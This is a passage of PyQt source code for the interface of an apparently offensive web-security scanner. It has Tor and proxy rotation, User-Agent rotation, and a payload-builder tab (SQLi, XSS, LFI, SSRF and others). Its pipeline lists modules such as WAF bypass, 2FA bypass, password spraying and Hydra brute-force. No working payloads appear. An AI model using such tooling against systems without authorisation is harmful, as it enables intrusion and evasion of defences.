        g = QGroupBox("PROXY / TOR")
        lay = QFormLayout(g)
        lay.setSpacing(6)

        self._proxy_edit = QLineEdit()
        self._proxy_edit.setPlaceholderText("socks5://127.0.0.1:9050")
        lay.addRow("Proxy:", self._proxy_edit)

        self._rotate_spin = QSpinBox()
        self._rotate_spin.setRange(1, 1000)
        self._rotate_spin.setValue(10)
        lay.addRow("Rotate every:", self._rotate_spin)

        self._ua_edit = QLineEdit()
        self._ua_edit.setPlaceholderText("Leave blank to rotate automatically")
        lay.addRow("User-Agent:", self._ua_edit)

        self._rotate_ua_cb = QCheckBox("Rotate User-Agent")
        self._rotate_ua_cb.setChecked(True)
        lay.addRow("", self._rotate_ua_cb)
        return g

    def _build_auth_section(self) -> QGroupBox:
        g = QGroupBox("AUTHENTICATION")
        lay = QFormLayout(g)
        lay.setSpacing(6)

        self._auth_edit = QLineEdit()
        self._auth_edit.setPlaceholderText("user:password")
        lay.addRow("Basic Auth:", self._auth_edit)

        self._bearer_edit = QLineEdit()
        self._bearer_edit.setPlaceholderText("Bearer token")
        self._bearer_edit.setEchoMode(QLineEdit.EchoMode.Password)
        lay.addRow("Bearer Token:", self._bearer_edit)

        self._cookie_edit = QLineEdit()
        self._cookie_edit.setPlaceholderText("name=val; name2=val2")
        lay.addRow("Cookies:", self._cookie_edit)
        return g

    def _build_output_section(self) -> QGroupBox:
        g = QGroupBox("OUTPUT")
        lay = QFormLayout(g)
        lay.setSpacing(6)

        out_row = QHBoxLayout()
        self._outdir_edit = QLineEdit()
        self._outdir_edit.setText(".")
        btn_out = QPushButton("…")
        btn_out.setFixedWidth(28)
        btn_out.clicked.connect(self._browse_outdir)
        out_row.addWidget(self._outdir_edit)
        out_row.addWidget(btn_out)
        lay.addRow("Output Dir:", out_row)

        self._fmt_checks: dict[str, QCheckBox] = {}
        fmt_row = QHBoxLayout()
        for fmt in ["json", "html", "csv", "markdown"]:
            cb = QCheckBox(fmt)
            cb.setChecked(fmt in ("json", "html"))
            self._fmt_checks[fmt] = cb
            fmt_row.addWidget(cb)
        lay.addRow("Formats:", fmt_row)
        return g

    def _build_right_panel(self) -> QWidget:
        w = QWidget()
        lay = QVBoxLayout(w)
        lay.setContentsMargins(0, 0, 0, 0)
        lay.setSpacing(0)

        self._tabs = QTabWidget()
        self._tabs.addTab(self._build_console_tab(),        "🖥 Console")
        self._tabs.addTab(self._build_findings_tab(),       "🔍 Findings")
        self._tabs.addTab(self._build_paths_tab(),          "📂 Paths")
        self._tabs.addTab(self._build_tech_tab(),           "⚙ Technologies")
        self._tabs.addTab(self._build_history_tab(),        "🕓 History")
        self._tabs.addTab(self._build_network_map_tab(),    "🌐 Network Map")
        self._tabs.addTab(self._build_diff_tab(),           "⬡ Diff")
        self._tabs.addTab(self._build_heatmap_tab(),        "📊 Heatmap")
        self._tabs.addTab(self._build_payload_builder_tab(),"⚡ Payloads")
        self._tabs.addTab(self._build_report_viewer_tab(),  "📄 Report Viewer")
        self._tabs.addTab(self._build_proxy_manager_tab(),  "🔗 Proxy Manager")
        self._tabs.addTab(self._build_terminal_tab(),       "💻 Terminal")
        self._tabs.addTab(self._build_notifications_tab(),  "🔔 Notifications")
        lay.addWidget(self._tabs)
        return w

    def _build_console_tab(self) -> QWidget:
        w = QWidget()
        lay = QVBoxLayout(w)
        lay.setContentsMargins(4, 4, 4, 4)
        lay.setSpacing(4)

        ctrl = QHBoxLayout()
        btn_clear = QPushButton("Clear")
        btn_clear.setFixedHeight(24)
        btn_clear.clicked.connect(lambda: self._console.clear())
        ctrl.addStretch()
        ctrl.addWidget(btn_clear)
        lay.addLayout(ctrl)

        self._aggressive_steps_panel = self._build_aggressive_steps_widget()
        self._aggressive_steps_panel.setVisible(False)
        lay.addWidget(self._aggressive_steps_panel)

        self._console = ConsoleWidget()
        lay.addWidget(self._console)
        return w

    def _build_aggressive_steps_widget(self) -> QWidget:
        w = QFrame()
        w.setFrameShape(QFrame.Shape.StyledPanel)
        w.setStyleSheet(
            "QFrame { background: #0f1a0f; border: 1px solid #ff6600; border-radius: 6px; }"
        )
        outer = QVBoxLayout(w)
        outer.setContentsMargins(8, 6, 8, 6)
        outer.setSpacing(6)

        header = QHBoxLayout()
        title = QLabel("⚡  AGGRESSIVE SCAN — MODULE PIPELINE")
        title.setStyleSheet("color: #ff6600; font-weight: bold; font-size: 11px; background: transparent; border: none;")
        header.addWidget(title)
        header.addStretch()
        self._step_progress_label = QLabel("0 / 31 modules complete")
        self._step_progress_label.setStyleSheet("color: #666; font-size: 10px; background: transparent; border: none;")
        header.addWidget(self._step_progress_label)
        outer.addLayout(header)

        scroll = QScrollArea()
        scroll.setHorizontalScrollBarPolicy(Qt.ScrollBarPolicy.ScrollBarAsNeeded)
        scroll.setVerticalScrollBarPolicy(Qt.ScrollBarPolicy.ScrollBarAlwaysOff)
        scroll.setWidgetResizable(True)
        scroll.setFixedHeight(72)
        scroll.setStyleSheet("QScrollArea { border: none; background: transparent; }")

        inner = QWidget()
        inner.setStyleSheet("background: transparent;")
        row = QHBoxLayout(inner)
        row.setContentsMargins(2, 2, 2, 2)
        row.setSpacing(2)

        self._step_widgets: dict[str, tuple] = {}
        module_steps = [
            ("Technology\nFingerprinting",  "Technology Fingerprinting"),
            ("Information\nDisclosure",     "Information Disclosure"),
            ("Security\nHeaders",           "Security Headers"),
            ("SSL/TLS\nAnalysis",           "SSL/TLS Analysis"),
            ("HTTP\nMethods",               "HTTP Methods"),
            ("WAF\nDetection",              "WAF Detection & Bypass"),
            ("Vulnerability\nScanning",     "Vulnerability Scanning"),
            ("CMS\nScanning",               "CMS Scanning"),
            ("API\nScanning",               "API Scanning"),
            ("VHost\nScanning",             "Virtual Host Scanning"),
            ("Web\nCrawling",               "Web Crawling"),
            ("Directory\nBrute-Force",      "Directory Brute-Force"),
            ("Port\nScanning",              "Port Scanning"),
            ("DNS\nAdvanced",               "DNS Advanced"),
            ("CT\nSubdomains",              "Certificate Transparency"),
            ("Subdomain\nTakeover",         "Subdomain Takeover"),
            ("Exploit\nConfirm",            "Exploit Confirmation"),
            ("JWT\nAttacks",                "JWT Attack"),
            ("Deserialization\nDetect",     "Deserialization"),
            ("OAuth\nAttacks",              "OAuth Attack"),
            ("2FA\nBypass",                 "2FA Bypass"),
            ("Password\nSpray",             "Password Spray"),
            ("Nuclei\nTemplates",           "Nuclei Templates"),
            ("Protocol\nFuzzing",           "Protocol Fuzzing"),
            ("ML\nWordlist",                "ML Wordlist"),
            ("Threat\nIntel",               "Threat Intel"),
            ("Hydra\nBrute-Force",          "Hydra Brute-Force"),
            ("SQLi\nAdvanced",              "SQLi Advanced"),
            ("Padding\nOracle",             "Padding Oracle"),
            ("S3\nBucket Scan",             "S3 Bucket Scan"),
            ("Web\nSploit",                 "WebSploit"),
        ]

        for i, (short_name, event_name) in enumerate(module_steps):
            if i > 0:
                arr = QLabel("›")
                arr.setStyleSheet("color: #2a2a2a; font-size: 18px; background: transparent; border: none;")
                arr.setAlignment(Qt.AlignmentFlag.AlignVCenter)
                row.addWidget(arr)

            box = QFrame()
            box.setFixedSize(90, 56)
            box.setStyleSheet(
                "QFrame { background: #1a1a1a; border: 1px solid #2a2a2a; border-radius: 4px; }"
            )
            box_lay = QVBoxLayout(box)
            box_lay.setContentsMargins(2, 2, 2, 2)
            box_lay.setSpacing(1)

            icon = QLabel("○")
            icon.setAlignment(Qt.AlignmentFlag.AlignCenter)
            icon.setStyleSheet("color: #333; font-size: 15px; background: transparent; border: none;")

            name_lbl = QLabel(short_name)
            name_lbl.setAlignment(Qt.AlignmentFlag.AlignCenter)
            name_lbl.setStyleSheet("color: #444; font-size: 8px; background: transparent; border: none;")

            box_lay.addWidget(icon)
            box_lay.addWidget(name_lbl)

            self._step_widgets[event_name] = (box, icon, name_lbl)
            row.addWidget(box)

        row.addStretch()
        scroll.setWidget(inner)
        outer.addWidget(scroll)
        return w

    def _reset_aggressive_steps(self) -> None:
        self._step_done_count = 0
        total = 31
        self._step_progress_label.setText(f"0 / {total} modules complete")
        for box, icon, name_lbl in self._step_widgets.values():
            box.setStyleSheet(
                "QFrame { background: #1a1a1a; border: 1px solid #2a2a2a; border-radius: 4px; }"
            )
            icon.setText("○")
            icon.setStyleSheet("color: #333; font-size: 15px; background: transparent; border: none;")
            name_lbl.setStyleSheet("color: #444; font-size: 8px; background: transparent; border: none;")

    def _set_step_state(self, module_name: str, state: str) -> None:
        entry = self._step_widgets.get(module_name)
        if not entry:
            return
        box, icon, name_lbl = entry
        total = len(self._step_widgets)
        if state == "running":
            box.setStyleSheet(
                "QFrame { background: #1f1500; border: 2px solid #ff6600; border-radius: 4px; }"
            )
            icon.setText("⟳")
            icon.setStyleSheet("color: #ff6600; font-size: 15px; background: transparent; border: none;")
            name_lbl.setStyleSheet("color: #ff6600; font-size: 8px; background: transparent; border: none;")
        elif state == "done":
            box.setStyleSheet(
                "QFrame { background: #0a1f0a; border: 1px solid #00ff41; border-radius: 4px; }"
            )
            icon.setText("✓")
            icon.setStyleSheet("color: #00ff41; font-size: 15px; background: transparent; border: none;")
            name_lbl.setStyleSheet("color: #00ff41; font-size: 8px; background: transparent; border: none;")
            self._step_done_count = getattr(self, "_step_done_count", 0) + 1
            self._step_progress_label.setText(f"{self._step_done_count} / {total} modules complete")

    def _build_findings_tab(self) -> QWidget:
        w = QWidget()
        lay = QVBoxLayout(w)
        lay.setContentsMargins(4, 4, 4, 4)
        lay.setSpacing(4)

        ctrl = QHBoxLayout()
        self._finding_filter = QLineEdit()
        self._finding_filter.setPlaceholderText("Filter findings…")
        self._finding_filter.setFixedHeight(26)
        self._finding_filter.textChanged.connect(self._filter_findings)

        self._sev_filter = QComboBox()
        self._sev_filter.addItems(["All Severities", "critical", "high", "medium", "low", "info"])
        self._sev_filter.setFixedHeight(26)
        self._sev_filter.currentTextChanged.connect(self._filter_findings)

        btn_export = QPushButton("Export CSV")
        btn_export.setFixedHeight(26)
        btn_export.clicked.connect(self._export_findings_csv)

        ctrl.addWidget(self._finding_filter, 2)
        ctrl.addWidget(self._sev_filter, 1)
        ctrl.addWidget(btn_export)
        lay.addLayout(ctrl)

        self._findings_table = QTableWidget(0, 5)
        self._findings_table.setHorizontalHeaderLabels(["Severity", "Title", "Module", "URL", "CVE"])
        self._findings_table.horizontalHeader().setSectionResizeMode(1, QHeaderView.ResizeMode.Stretch)
        self._findings_table.horizontalHeader().setSectionResizeMode(3, QHeaderView.ResizeMode.Stretch)
        self._findings_table.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows)
        self._findings_table.setEditTriggers(QTableWidget.EditTrigger.NoEditTriggers)
        self._findings_table.setAlternatingRowColors(True)
        self._findings_table.verticalHeader().setVisible(False)
        self._findings_table.setColumnWidth(0, 80)
        self._findings_table.setColumnWidth(2, 120)
        self._findings_table.setColumnWidth(4, 100)
        self._findings_table.doubleClicked.connect(self._show_finding_detail)
        lay.addWidget(self._findings_table)
        return w

    def _build_paths_tab(self) -> QWidget:
        w = QWidget()
        lay = QVBoxLayout(w)
        lay.setContentsMargins(4, 4, 4, 4)
        lay.setSpacing(4)

        ctrl = QHBoxLayout()
        self._path_filter = QLineEdit()
        self._path_filter.setPlaceholderText("Filter paths…")
        self._path_filter.setFixedHeight(26)
        self._path_filter.textChanged.connect(self._filter_paths)
        ctrl.addWidget(self._path_filter)
        lay.addLayout(ctrl)

        self._paths_table = QTableWidget(0, 5)
        self._paths_table.setHorizontalHeaderLabels(["Status", "URL", "Size", "Type", "Time"])
        self._paths_table.horizontalHeader().setSectionResizeMode(1, QHeaderView.ResizeMode.Stretch)
        self._paths_table.horizontalHeader().setSectionResizeMode(2, QHeaderView.ResizeMode.Interactive)
        self._paths_table.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows)
        self._paths_table.setEditTriggers(QTableWidget.EditTrigger.NoEditTriggers)
        self._paths_table.setAlternatingRowColors(True)
        self._paths_table.verticalHeader().setVisible(False)
        self._paths_table.setColumnWidth(0, 60)
        self._paths_table.setColumnWidth(2, 80)
        self._paths_table.setColumnWidth(3, 150)
        self._paths_table.setColumnWidth(4, 70)
        lay.addWidget(self._paths_table)
        return w

    def _build_tech_tab(self) -> QWidget:
        w = QWidget()
        lay = QVBoxLayout(w)
        lay.setContentsMargins(4, 4, 4, 4)

        self._tech_tree = QTreeWidget()
        self._tech_tree.setHeaderLabels(["Technology", "Version", "Evidence"])
        self._tech_tree.header().setSectionResizeMode(0, QHeaderView.ResizeMode.Interactive)
        self._tech_tree.header().setSectionResizeMode(2, QHeaderView.ResizeMode.Stretch)
        self._tech_tree.setColumnWidth(0, 200)
        self._tech_tree.setColumnWidth(1, 100)
        self._tech_tree.setStyleSheet("QTreeWidget { background: #141414; border: none; }"
                                      "QTreeWidget::item { padding: 4px; }"
                                      "QTreeWidget::item:selected { background: #1a3a1a; }")
        lay.addWidget(self._tech_tree)
        return w

    def _build_history_tab(self) -> QWidget:
        w = QWidget()
        lay = QVBoxLayout(w)
        lay.setContentsMargins(4, 4, 4, 4)
        lay.setSpacing(4)

        ctrl = QHBoxLayout()
        self._hist_search = QLineEdit()
        self._hist_search.setPlaceholderText("Search history (target / findings)…")
        self._hist_search.setFixedHeight(26)
        self._hist_search.returnPressed.connect(self._search_history)
        btn_search = QPushButton("Search")
        btn_search.setFixedHeight(26)
        btn_search.clicked.connect(self._search_history)
        btn_refresh = QPushButton("Refresh")
        btn_refresh.setFixedHeight(26)
        btn_refresh.clicked.connect(self._load_history)
        btn_load = QPushButton("Load Scan")
        btn_load.setFixedHeight(26)
        btn_load.clicked.connect(self._load_scan_from_history)
        btn_delete = QPushButton("Delete")
        btn_delete.setFixedHeight(26)
        btn_delete.clicked.connect(self._delete_history_scan)
        ctrl.addWidget(self._hist_search, 2)
        ctrl.addWidget(btn_search)
        ctrl.addWidget(btn_refresh)
        ctrl.addWidget(btn_load)
        ctrl.addWidget(btn_delete)
        lay.addLayout(ctrl)

        self._hist_table = QTableWidget(0, 6)
        self._hist_table.setHorizontalHeaderLabels(["ID", "Target", "Date", "Duration", "Requests", "Findings"])
        self._hist_table.horizontalHeader().setSectionResizeMode(1, QHeaderView.ResizeMode.Stretch)
        self._hist_table.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows)
        self._hist_table.setEditTriggers(QTableWidget.EditTrigger.NoEditTriggers)
        self._hist_table.setAlternatingRowColors(True)
        self._hist_table.verticalHeader().setVisible(False)
        self._hist_table.setColumnWidth(0, 50)
        self._hist_table.setColumnWidth(2, 160)
        self._hist_table.setColumnWidth(3, 90)
        self._hist_table.setColumnWidth(4, 90)
        self._hist_table.setColumnWidth(5, 90)
        self._hist_table.doubleClicked.connect(self._load_scan_from_history)
        lay.addWidget(self._hist_table)
        return w

    def _build_network_map_tab(self) -> QWidget:
        w = QWidget()
        lay = QVBoxLayout(w)
        lay.setContentsMargins(4, 4, 4, 4)
        lay.setSpacing(4)

        ctrl = QHBoxLayout()
        btn_refresh = QPushButton("Refresh Map")
        btn_refresh.setFixedHeight(26)
        btn_refresh.clicked.connect(self._refresh_network_map)
        btn_reset = QPushButton("Reset Zoom")
        btn_reset.setFixedHeight(26)
        btn_reset.clicked.connect(lambda: self._net_map.fitInView(
            self._net_map._scene.sceneRect(), Qt.AspectRatioMode.KeepAspectRatio))
        lbl = QLabel("Scroll to zoom · Drag to pan · Double-click node to open URL")
        lbl.setStyleSheet("color:#555; font-size:10px;")
        ctrl.addWidget(btn_refresh)
        ctrl.addWidget(btn_reset)
        ctrl.addStretch()
        ctrl.addWidget(lbl)
        lay.addLayout(ctrl)

        self._net_map = NetworkMapWidget()
        lay.addWidget(self._net_map)
        return w

    def _build_diff_tab(self) -> QWidget:
        w = QWidget()
        lay = QVBoxLayout(w)
        lay.setContentsMargins(4, 4, 4, 4)
        lay.setSpacing(4)

        file_row = QHBoxLayout()
        self._diff_left_edit = QLineEdit()
        self._diff_left_edit.setPlaceholderText("Baseline scan JSON…")
        self._diff_left_edit.setFixedHeight(26)
        btn_left = QPushButton("Browse…")
        btn_left.setFixedHeight(26)
        btn_left.clicked.connect(self._load_diff_left)
        self._diff_right_edit = QLineEdit()
        self._diff_right_edit.setPlaceholderText("New scan JSON…")
        self._diff_right_edit.setFixedHeight(26)
        btn_right = QPushButton("Browse…")
        btn_right.setFixedHeight(26)
        btn_right.clicked.connect(self._load_diff_right)
        btn_diff = QPushButton("Run Diff ▶")
        btn_diff.setFixedHeight(26)
        btn_diff.clicked.connect(self._run_diff)
        file_row.addWidget(QLabel("Baseline:"))
        file_row.addWidget(self._diff_left_edit, 1)
        file_row.addWidget(btn_left)
        file_row.addWidget(QLabel("  New:"))
        file_row.addWidget(self._diff_right_edit, 1)
        file_row.addWidget(btn_right)
        file_row.addWidget(btn_diff)
        lay.addLayout(file_row)

        splitter = QSplitter(Qt.Orientation.Horizontal)
        left_w = QWidget()
        left_lay = QVBoxLayout(left_w)
        left_lay.setContentsMargins(0, 0, 0, 0)
        left_lay.addWidget(QLabel("🟢 New Findings (appeared)"))
        self._diff_new_table = QTableWidget(0, 3)
        self._diff_new_table.setHorizontalHeaderLabels(["Severity", "Title", "URL"])
        self._diff_new_table.horizontalHeader().setSectionResizeMode(1, QHeaderView.ResizeMode.Stretch)
        self._diff_new_table.setEditTriggers(QTableWidget.EditTrigger.NoEditTriggers)
        self._diff_new_table.verticalHeader().setVisible(False)
        left_lay.addWidget(self._diff_new_table)

        right_w = QWidget()
        right_lay = QVBoxLayout(right_w)
        right_lay.setContentsMargins(0, 0, 0, 0)
        right_lay.addWidget(QLabel("🔴 Fixed Findings (disappeared)"))
        self._diff_fixed_table = QTableWidget(0, 3)
        self._diff_fixed_table.setHorizontalHeaderLabels(["Severity", "Title", "URL"])
        self._diff_fixed_table.horizontalHeader().setSectionResizeMode(1, QHeaderView.ResizeMode.Stretch)
        self._diff_fixed_table.setEditTriggers(QTableWidget.EditTrigger.NoEditTriggers)
        self._diff_fixed_table.verticalHeader().setVisible(False)
        right_lay.addWidget(self._diff_fixed_table)

        splitter.addWidget(left_w)
        splitter.addWidget(right_w)
        splitter.setSizes([500, 500])
        lay.addWidget(splitter)

        self._diff_summary = QLabel("Load two scan JSON files and click Run Diff.")
        self._diff_summary.setStyleSheet("color:#555; font-size:11px; padding:4px;")
        lay.addWidget(self._diff_summary)
        return w

    def _build_heatmap_tab(self) -> QWidget:
        w = QWidget()
        lay = QVBoxLayout(w)
        lay.setContentsMargins(4, 4, 4, 4)
        lay.setSpacing(4)

        ctrl = QHBoxLayout()
        btn_sev = QPushButton("Severity Distribution")
        btn_sev.setFixedHeight(26)
        btn_sev.clicked.connect(self._refresh_heatmap)
        btn_time = QPushButton("Findings Timeline")
        btn_time.setFixedHeight(26)
        btn_time.clicked.connect(self._refresh_timeline)
        ctrl.addWidget(btn_sev)
        ctrl.addWidget(btn_time)
        ctrl.addStretch()
        lay.addLayout(ctrl)

        self._heatmap_widget = MatplotlibWidget()
        lay.addWidget(self._heatmap_widget)
        return w

    def _build_payload_builder_tab(self) -> QWidget:
        w = QWidget()
        lay = QHBoxLayout(w)
        lay.setContentsMargins(4, 4, 4, 4)
        lay.setSpacing(8)

        left = QGroupBox("Payload Types")
        left_lay = QVBoxLayout(left)
        left.setFixedWidth(200)
        self._payload_type_list = QListWidget()
        for pt in ["SQLi", "XSS", "LFI", "RFI", "SSTI", "SSRF", "XXE",
                   "Open Redirect", "CRLF", "Host Header", "Path Traversal", "Custom"]:
            self._payload_type_list.addItem(pt)
        self._payload_type_list.currentItemChanged.connect(self._on_payload_type_changed)
        left_lay.addWidget(self._payload_type_list)
        lay.addWidget(left)

        right = QGroupBox("Payloads")
        right_lay = QVBoxLayout(right)
        ctrl_row = QHBoxLayout()
        btn_add = QPushButton("+ Add")
        btn_add.setFixedHeight(24)
        btn_add.clicked.connect(self._add_payload)
        btn_del = QPushButton("✕ Delete")
        btn_del.setFixedHeight(24)
        btn_del.clicked.connect(self._delete_payload)
        btn_copy = QPushButton("Copy All")
        btn_copy.setFixedHeight(24)
        btn_copy.clicked.connect(self._copy_payloads)
        ctrl_row.addWidget(btn_add)
        ctrl_row.addWidget(btn_del)
        ctrl_row.addWidget(btn_copy)
        ctrl_row.addStretch()
        right_lay.addLayout(ctrl_row)
        self._payload_list = QListWidget()
        self._payload_list.setSelectionMode(QListWidget.SelectionMode.ExtendedSelection)
        right_lay.addWidget(self._payload_list)
        self._payload_edit = QPlainTextEdit()
        self._payload_edit.setPlaceholderText("Edit selected payload or add custom payload here…")
        self._payload_edit.setFixedHeight(80)
        right_lay.addWidget(self._payload_edit)
        lay.addWidget(right)
        return w

    def _build_report_viewer_tab(self) -> QWidget:
        w = QWidget()
        lay = QVBoxLayout(w)
        lay.setContentsMargins(4, 4, 4, 4)
        lay.setSpacing(4)

        ctrl = QHBoxLayout()
        self._report_path_edit = QLineEdit()
        self._report_path_edit.setPlaceholderText("Path to HTML report file…")
        self._report_path_edit.setFixedHeight(26)
        btn_browse = QPushButton("Browse…")
        btn_browse.setFixedHeight(26)
        btn_browse.clicked.connect(self._browse_report)
        btn_open = QPushButton("Open in Browser")
        btn_open.setFixedHeight(26)
        btn_open.clicked.connect(lambda: QDesktopServices.openUrl(
            QUrl.fromLocalFile(self._report_path_edit.text())))
        ctrl.addWidget(self._report_path_edit, 1)
        ctrl.addWidget(btn_browse)
        ctrl.addWidget(btn_open)
        lay.addLayout(ctrl)

        self._report_browser = QTextBrowser()
        self._report_browser.setOpenExternalLinks(True)
        self._report_browser.setStyleSheet("background:#1a1a1a; color:#ccc;")
        lay.addWidget(self._report_browser)
        return w

    def _build_proxy_manager_tab(self) -> QWidget:
        w = QWidget()
        lay = QVBoxLayout(w)
        lay.setContentsMargins(4, 4, 4, 4)
        lay.setSpacing(4)

        ctrl = QHBoxLayout()
        self._proxy_input = QLineEdit()
        self._proxy_input.setPlaceholderText("socks5://127.0.0.1:9050  or  http://user:pass@host:port")
        self._proxy_input.setFixedHeight(26)
        btn_add = QPushButton("Add")
        btn_add.setFixedHeight(26)
        btn_add.clicked.connect(self._add_proxy_row)
        btn_del = QPushButton("Remove")
        btn_del.setFixedHeight(26)
        btn_del.clicked.connect(self._remove_proxy_row)
        btn_test = QPushButton("Test All")
        btn_test.setFixedHeight(26)
        btn_test.clicked.connect(self._test_all_proxies)
        btn_load = QPushButton("Load from File…")
        btn_load.setFixedHeight(26)
        btn_load.clicked.connect(self._load_proxies_from_file)
        ctrl.addWidget(self._proxy_input, 2)
        ctrl.addWidget(btn_add)
        ctrl.addWidget(btn_del)
        ctrl.addWidget(btn_test)
        ctrl.addWidget(btn_load)
        lay.addLayout(ctrl)

        self._proxy_table = QTableWidget(0, 4)
        self._proxy_table.setHorizontalHeaderLabels(["Proxy URL", "Type", "Status", "Latency"])
        self._proxy_table.horizontalHeader().setSectionResizeMode(0, QHeaderView.ResizeMode.Stretch)
        self._proxy_table.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows)
        self._proxy_table.setEditTriggers(QTableWidget.EditTrigger.NoEditTriggers)
        self._proxy_table.setAlternatingRowColors(True)
        self._proxy_table.verticalHeader().setVisible(False)
        self._proxy_table.setColumnWidth(1, 80)
        self._proxy_table.setColumnWidth(2, 80)
        self._proxy_table.setColumnWidth(3, 80)
        lay.addWidget(self._proxy_table)
        return w

    def _build_terminal_tab(self) -> QWidget:
        w = QWidget()
        lay = QVBoxLayout(w)
        lay.setContentsMargins(0, 0, 0, 0)
        self._terminal = TerminalWidget()
        lay.addWidget(self._terminal)
        return w

    def _build_notifications_tab(self) -> QWidget:
        w = QWidget()
        lay = QVBoxLayout(w)
        lay.setContentsMargins(8, 8, 8, 8)
        lay.setSpacing(10)

        slack_grp = QGroupBox("Slack")
        slack_lay = QFormLayout(slack_grp)
        self._slack_url_edit = QLineEdit()
        self._slack_url_edit.setPlaceholderText("https://hooks.slack.com/services/…")
        self._slack_url_edit.setFixedHeight(28)
        slack_lay.addRow("Webhook URL:", self._slack_url_edit)
        lay.addWidget(slack_grp)

        discord_grp = QGroupBox("Discord")
        discord_lay = QFormLayout(discord_grp)
        self._discord_url_edit = QLineEdit()
        self._discord_url_edit.setPlaceholderText("https://discord.com/api/webhooks/…")
        self._discord_url_edit.setFixedHeight(28)
        discord_lay.addRow("Webhook URL:", self._discord_url_edit)
        lay.addWidget(discord_grp)

        email_grp = QGroupBox("Email (SMTP)")
        email_lay = QFormLayout(email_grp)
        self._smtp_host_edit = QLineEdit()
        self._smtp_host_edit.setPlaceholderText("smtp.gmail.com")
        self._smtp_host_edit.setFixedHeight(28)
        self._smtp_port_spin = QSpinBox()
        self._smtp_port_spin.setRange(1, 65535)
        self._smtp_port_spin.setValue(587)
        self._smtp_user_edit = QLineEdit()
        self._smtp_user_edit.setFixedHeight(28)
        self._smtp_pass_edit = QLineEdit()
        self._smtp_pass_edit.setEchoMode(QLineEdit.EchoMode.Password)
        self._smtp_pass_edit.setFixedHeight(28)
        self._smtp_to_edit = QLineEdit()
        self._smtp_to_edit.setPlaceholderText("recipient@example.com")
        self._smtp_to_edit.setFixedHeight(28)
        email_lay.addRow("SMTP Host:", self._smtp_host_edit)
        email_lay.addRow("Port:", self._smtp_port_spin)
        email_lay.addRow("Username:", self._smtp_user_edit)
        email_lay.addRow("Password:", self._smtp_pass_edit)
        email_lay.addRow("Send To:", self._smtp_to_edit)
        lay.addWidget(email_grp)

        thresh_grp = QGroupBox("Alert Thresholds")
        thresh_lay = QHBoxLayout(thresh_grp)
        self._notif_crit_cb = QCheckBox("Critical")
        self._notif_crit_cb.setChecked(True)
        self._notif_high_cb = QCheckBox("High")
        self._notif_high_cb.setChecked(True)
        self._notif_med_cb = QCheckBox("Medium")
        self._notif_low_cb = QCheckBox("Low")
        for cb in [self._notif_crit_cb, self._notif_high_cb, self._notif_med_cb, self._notif_low_cb]:
            thresh_lay.addWidget(cb)
        thresh_lay.addStretch()
        lay.addWidget(thresh_grp)

        btn_row = QHBoxLayout()
        btn_save = QPushButton("Save Configuration")
        btn_save.setFixedHeight(30)
        btn_save.clicked.connect(self._save_notifications)
        btn_test = QPushButton("Send Test Alert")
        btn_test.setFixedHeight(30)
        btn_test.clicked.connect(self._test_notifications)
        btn_row.addWidget(btn_save)
        btn_row.addWidget(btn_test)
        btn_row.addStretch()
        lay.addLayout(btn_row)
        lay.addStretch()
        return w

    def _build_bottom_bar(self) -> QWidget:
        w = QWidget()
        w.setStyleSheet("background-color: #0a0a0a; border-top: 1px solid #1a1a1a;")
        w.setFixedHeight(56)
        lay = QHBoxLayout(w)
        lay.setContentsMargins(16, 8, 16, 8)
        lay.setSpacing(12)

        self._start_btn = QPushButton("▶  START SCAN")
        self._start_btn.setObjectName("startBtn")
        self._start_btn.setFixedHeight(38)
        self._start_btn.clicked.connect(self._start_scan)

        self._stop_btn = QPushButton("■  STOP")
        self._stop_btn.setObjectName("stopBtn")
        self._stop_btn.setFixedHeight(38)
        self._stop_btn.setEnabled(False)
        self._stop_btn.clicked.connect(self._stop_scan)

        self._progress = QProgressBar()
        self._progress.setRange(0, 100)
        self._progress.setValue(0)
        self._progress.setFixedHeight(8)

        self._module_label = QLabel("Idle")
        self._module_label.setStyleSheet("color: #555; font-size: 11px;")

        lay.addWidget(self._start_btn)
        lay.addWidget(self._stop_btn)
        right = QVBoxLayout()
        right.setSpacing(2)
        right.addWidget(self._progress)
        right.addWidget(self._module_label)
        lay.addLayout(right, 1)
        return w

    def _apply_profile(self) -> None:
        name = self._profile_combo.currentData()
        if not name:
            return
        try:
            p = load_profile(name)
            self._threads_spin.setValue(p.get("threads", 50))
            self._delay_min_spin.setValue(p.get("delay_min", 0.0))
            self._delay_max_spin.setValue(p.get("delay_max", 0.5))
            self._rate_spin.setValue(p.get("rate_limit", 0))
            self._wordlist_combo.setCurrentText(p.get("wordlist_size", "medium"))
            self._recursive_cb.setChecked(p.get("recursive", False))

            modules = p.get("modules", [])
            for key, cb in self._module_checks.items():
                cb.setChecked(not modules or key in modules)
        except Exception:
            pass
        self._aggressive_steps_panel.setVisible(name == "aggressive")

    def _browse_wordlist(self) -> None:
        path, _ = QFileDialog.getOpenFileName(self, "Select Wordlist", "", "Text Files (*.txt);;All Files (*)")
        if path:
            self._wordlist_edit.setText(path)

    def _browse_outdir(self) -> None:
        path = QFileDialog.getExistingDirectory(self, "Select Output Directory")
        if path:
            self._outdir_edit.setText(path)

    def _build_config(self) -> Optional[ScanConfig]:
        target = self._target_edit.text().strip()
        if not target:
            QMessageBox.warning(self, "Missing Target", "Please enter a target URL.")
            return None
        if not target.startswith(("http://", "https://")):
            target = "http://" + target

        proxies = []
        raw_proxy = self._proxy_edit.text().strip()
        if raw_proxy:
            proxies = [p.strip() for p in raw_proxy.split(",") if p.strip()]

        ext_list = [e.strip().lstrip(".") for e in self._ext_edit.text().split(",") if e.strip()]

        selected = [ScanModule(k) for k, cb in self._module_checks.items() if cb.isChecked()]

        auth_tuple = None
        raw_auth = self._auth_edit.text().strip()
        if raw_auth and ":" in raw_auth:
            u, _, pw = raw_auth.partition(":")
            auth_tuple = (u, pw)

        cookies = {}
        raw_cookie = self._cookie_edit.text().strip()
        if raw_cookie:
            for pair in raw_cookie.split(";"):
                pair = pair.strip()
                if "=" in pair:
                    n, _, v = pair.partition("=")
                    cookies[n.strip()] = v.strip()

        formats = [k for k, cb in self._fmt_checks.items() if cb.isChecked()] or ["json", "html"]

        return ScanConfig(
            target=target,
            threads=max(1, min(self._threads_spin.value(), 1000)),
            timeout=self._timeout_spin.value(),
            retries=2,
            delay_min=self._delay_min_spin.value(),
            delay_max=self._delay_max_spin.value(),
            rate_limit=self._rate_spin.value(),
            wordlist=self._wordlist_edit.text().strip() or None,
